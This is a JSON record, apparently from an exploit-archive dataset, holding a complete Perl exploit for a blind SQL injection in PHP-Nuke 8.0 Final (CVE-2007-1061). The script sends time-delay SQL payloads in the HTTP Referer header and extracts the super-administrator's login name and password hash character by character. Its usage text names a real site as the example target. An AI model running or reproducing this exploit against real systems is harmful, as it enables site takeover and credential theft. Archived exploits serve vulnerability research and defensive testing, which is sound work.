{
  "id": "3344",
  "title": "PHP-Nuke 8.0 Final - &#039;INSERT&#039; Blind SQL Injection (MySQL)",
  "cve": "CVE-2007-1061",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl \r\n#0day exploit for PHP-nuke <=8.0 Final\r\n#Blind sql injection attack in INSERT syntax\r\n#version for mysql >= 4.0.24, using 'brute force'\r\n#Coded by:Maciej `krasza` Kukla[krasza@gmail.com]\r\n#Screenshot:\r\n#0day exploit for PHP-nuke <=8.0 Final\r\n#Sql injection attack in INSERT syntax\r\n#Coded by:Maciej `krasza` Kukla[krasza@gmail.com]\r\n#\r\n#[+]Time normal query: 2 seconds\r\n#[+]Length user's record: 5\r\n#[+]Length password's record: 32\r\n#[+]Login:\r\n#admin\r\n#[+]Password:\r\n#b481ab90de84a345c665f1e4ef3c2\r\n#[+]Super admin:\r\n#admin:b481ab90de84a345c66585e1f4cf16e4\r\nuse strict;\r\nuse warnings;\r\nuse LWP;\r\nmy $offset=4;#It is the most important variable!!\r\nmy $adres=shift or help();\r\nmy $ua = LWP::UserAgent->new;\r\nmy $zadanie = HTTP::Request->new(GET => $adres);\r\nmy ($respone,$komenda,$poczatek,$koniec,$czas_nor,$i,$j,$dlugosc_user,$user,$hash,$referer,$czy_dziala,$znak);\r\nbanner();\r\n$czas_nor=polacz(\"http://www.krasza.int.pl\");\r\nprint \"[+]Time normal query: $czas_nor seconds\\n\";\r\n$dlugosc_user=ustal_dlugosc(\"aid\",8);\r\nprint \"[+]Length user's record: $dlugosc_user\\n\";\r\nprint \"[+]Length password's record: 32\\n\";\r\nprint \"[+]Login:\\n\";\r\n$user=brute_force_aid($dlugosc_user);\r\nprint \"[+]Password:\\n\";\r\n$hash=brute_force_pass(32);\r\nprint \"[+]Super admin:\\n\";\r\nprint \"$user:$hash\\n\";\r\n##\r\nsub brute_force_pass{\r\n\tmy ($dlugosc)=@_;\r\n\tmy ($i,$j,$referer,$wynik,$dolny_zakres);\r\n\tfor($i=1;$i<=$dlugosc;$i++){\r\n\t\tfor($j=48;$j<=122;$j++){\r\n\t\t$referer=\"http://www.krasza.int.pl'),(-1,(SELECT IF((ASCII(SUBSTRING(`pwd`,\".$i.\",1))=\".$j.\") & 1, benchmark(50000000,CHAR(0)),0) FROM `nuke_authors` WHERE `radminsuper`=1))/*\";\r\n        \t$czy_dziala=czy_dziala($referer);\r\n        \t\tif($czy_dziala==1){\r\n\t\t\t\t\t$znak=chr($j);\r\n\t\t\t\t\tprint \"$znak\";\r\n\t\t\t\t\t$wynik.=$znak;\r\n\t\t\t\tif($i<$dlugosc){\r\n\t\t\t\t\t$i+=1;\r\n\t\t\t\t\t$j=47;\r\n\t\t\t\t}else{\r\n\t\t\t\t\tlast;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\t#przeskok-optymalizacja;]\r\n\t\t\tif($j==57){\r\n\t\t\t\t$j=96;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\tprint \"\\n\";\r\n\t\treturn $wynik;\r\n}\r\nsub brute_force_aid{\r\n        my ($dlugosc)=@_;\r\n        my ($i,$j,$referer,$wynik,$dolny_zakres);\r\n        for($i=1;$i<=$dlugosc;$i++){\r\n                for($j=48;$j<=122;$j++){\r\n                $referer=\"http://www.krasza.int.pl'),(-1,(SELECT IF((ASCII(SUBSTRING(`aid`,\".$i.\",1))=\".$j.\") & 1, benchmark(50000000,CHAR(0)),0) FROM `nuke_authors` WHERE `radminsuper`=1))/*\";\r\n                $czy_dziala=czy_dziala($referer);\r\n                        if($czy_dziala==1){\r\n\t\t\t\t\t$znak=chr($j);\r\n                                \tprint \"$znak\";\r\n\t\t\t\t\t$wynik.=$znak;\r\n\t\t\t\tif($i<$dlugosc){\r\n                                \t$i+=1;\r\n\t\t\t\t\t$j=47;\r\n\t\t\t\t}else{\r\n\t\t\t\t\tlast;\r\n\t\t\t\t}\r\n                        }\r\n\t\t\tif($j==57){\r\n\t\t\t\t$j=64;\r\n\t\t\t}\r\n\t\t\tif($j==90){\r\n\t\t\t\t$j=96;\r\n\t\t\t}\r\n                }\r\n        }\r\n                print \"\\n\";\r\n                return $wynik;\r\n}\r\nsub ustal_dlugosc{\r\n\tmy ($pole,$len)=@_;\r\n\tmy ($referer,$narazie_dziala_liczba,$nie_dziala_liczba);\r\n\t$narazie_dziala_liczba=0;\r\n\t$nie_dziala_liczba=65;\r\n\t#for($len=1;$len<64;$len++){\r\n\twhile($len<=64){\r\n\t\tif($narazie_dziala_liczba==$len || $nie_dziala_liczba<=$len){\r\n\t\t\treturn $narazie_dziala_liczba;\r\n\t\t}\r\n\t\t$referer=\"http://www.krasza.int.pl'),(-1,(SELECT IF((LENGTH(`\".$pole.\"`)>\".$len.\") & 1, benchmark(50000000,CHAR(0)),0) FROM `nuke_authors` WHERE `radminsuper`=1))/*\";\r\n\t\t$czy_dziala=czy_dziala($referer);\r\n\t\tif($czy_dziala==1){\r\n\t\t\t$narazie_dziala_liczba=$len+1;\r\n\t\t\t$len+=2;\r\n\t\t}else{\r\n\t\t\t$nie_dziala_liczba=$len+1;\r\n\t\t\t$len-=1;\r\n\t\t}\r\n\t}\r\n\tprint \"[-]Exploit Failed\\n\";\r\n\texit;\r\n}\r\nsub czy_dziala{\r\n\tmy ($refik)=@_;\r\n\tmy $czas_zapytania;\r\n\t$czas_zapytania=polacz($refik);\r\n\tif($czas_zapytania>$czas_nor+$offset){\r\n\t\treturn 1;\r\n\t}else{\r\n\t\treturn 0;\r\n\t}\r\n}\r\nsub polacz{\r\n\tmy ($referrer)=@_;\r\n\tmy ($czas,$czas_poczatek,$czas_koniec);\r\n\t$zadanie->referer($referrer);\r\n\t$czas_poczatek=time();\r\n        $respone=$ua->request($zadanie);\r\n        $respone->is_success or die \"$adres : \",$respone->message,\"\\n\";\r\n        $czas_koniec=time();\r\n\t$czas=$czas_koniec-$czas_poczatek;\r\n\treturn $czas;\r\n}\r\nsub banner{\r\n\tprint \"0day exploit for PHP-nuke <=8.0 Final\\n\";\r\n        print \"Blind sql injection attack in INSERT syntax\\n\";\r\n\tprint \"version mysql >= 4.0.24, using 'brute force'\\n\";\r\n        print \"Coded by:Maciej `krasza` Kukla[krasza\\@gmail.com]\\n\\n\";\r\n}\r\nsub help{\r\n\tprint \"0day exploit for PHP-nuke <=8.0 Final\\n\";\r\n\tprint \"Blind sql injection attack in INSERT syntax\\n\";\r\n\tprint \"version mysql >= 4.0.24, using 'brute force'\\n\";\r\n\tprint \"Coded by:Maciej `krasza` Kukla[krasza\\@gmail.com]\\n\";\r\n\tprint \"Use:\\n\";\r\n\tprint \"\\tperl exploit.pl [url]\\n\";\r\n\tprint \"\\t[url]-vicitim webpage with index.php\\n\";\r\n\tprint \"Example:\\n\";\r\n\tprint \"\\tperl bruteforce.pl http://phpnuke.org/index.php\\n\";\r\n\texit(0);\r\n}\r\n\r\n# milw0rm.com [2007-02-20]",
  "url": "https://www.exploit-db.com/exploits/3344"
}